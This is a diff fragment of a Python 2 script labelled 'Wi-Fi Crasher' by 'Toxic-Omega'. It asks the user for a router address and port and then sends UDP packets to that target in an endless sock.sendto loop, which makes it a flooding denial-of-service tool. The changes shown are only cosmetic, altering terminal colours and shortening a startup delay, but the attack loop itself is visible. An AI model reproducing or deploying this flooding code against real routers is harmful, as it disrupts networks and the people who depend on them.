@@ -34,12 +34,13 @@ print("\033[31m        .:                            :-    ")
 print("                                        ")
 print("                 \033[32mWi-Fi Crasher             ")
 print("              \033[94mCoded By Toxic-Omega         ")
-print("\033[94m                                           ")
+print("\033[31m                                           ")
 ip = raw_input("              [?] Router Address >> ")
 port = input("              [?] Pouter Port >> ")
 
+print("\033[94m")
 os.system("clear")
-time.sleep(5)
+time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
